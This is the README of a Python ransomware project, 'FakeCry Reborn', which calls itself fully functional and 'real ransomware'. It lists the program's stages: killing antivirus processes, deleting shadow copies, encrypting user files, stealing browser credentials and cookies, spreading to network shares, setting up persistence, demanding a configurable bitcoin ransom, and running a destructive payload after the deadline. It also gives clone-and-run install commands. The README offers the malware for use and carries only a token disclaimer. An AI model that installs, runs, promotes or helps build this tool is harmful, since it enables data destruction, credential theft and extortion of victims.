# FakeCry Reborn

> **⚠️ WARNING: DESTRUCTIVE MALWARE**
>
> FakeCry Reborn is a fully functional ransomware proof-of-concept 

---

## Overview

FakeCry Reborn demonstrates the behavior and lifecycle of modern ransomware. It implements multiple stages commonly observed in real-world ransomware campaigns, including file encryption, persistence, credential theft, network propagation, and destructive payload execution.

**Use it on your own risk.**

---

## Features

- File encryption using XOR with a randomly generated 256-byte key
- Shadow copy and backup removal
- Workstation lock screen implementation
- Automatic propagation to accessible network shares
- Browser credential and cookie collection
- Persistence through Startup, Registry, and Scheduled Tasks
- Attempts to terminate common antivirus processes
- Configurable ransom countdown timer
- Destructive payload after payment deadline expiration

---

## Technical Overview

| Property | Value |
|----------|-------|
| **Language** | Python |
| **Encryption** | XOR (256-byte random key) |
| **Target Directories** | Documents, Desktop, Pictures, Videos, Downloads |
| **Target Extensions** | `.txt`, `.doc`, `.docx`, `.xls`, `.xlsx`, `.pdf`, `.jpg`, `.png`, `.mp3`, `.mp4`, `.zip`, `.rar`, `.7z`, `.psd`, `.ai` |
| **Default Ransom** | 2.5 BTC (configurable) |
| **Default Deadline** | 72 hours (configurable) |

---

## Execution Flow

The application performs the following stages:

1. Attempt to disable antivirus software
2. Delete Windows Shadow Copies and restore points
3. Encrypt targeted user files
4. Collect browser credentials and cookies
5. Propagate to available network shares
6. Lock the workstation and restrict user interaction
7. Establish persistence mechanisms
8. Deploy ransom notes
9. Start the countdown timer
10. Execute destructive actions after the configured deadline

---

## Installation

```bash
git clone https://github.com/PonySecs/FakeCry
cd FakeCry
pip install pywin32
python FakeCry.py
```

---

## Configuration

The following values can be customized within the `FakeCry` class:

| Setting | Description |
|----------|-------------|
| `bitcoin_address` | Bitcoin wallet address |
| `bitcoin_amount` | Requested ransom amount |
| `deadline_hours` | Countdown duration before final payload |
| `encrypted_ext` | Extension assigned to encrypted files |

---

## Disclaimer

This is real ransomware that is like no escape

---

## License

MIT License

---

> **Warning:** Running this program on any system outside of an isolated research environment may result in permanent data loss or system damage.
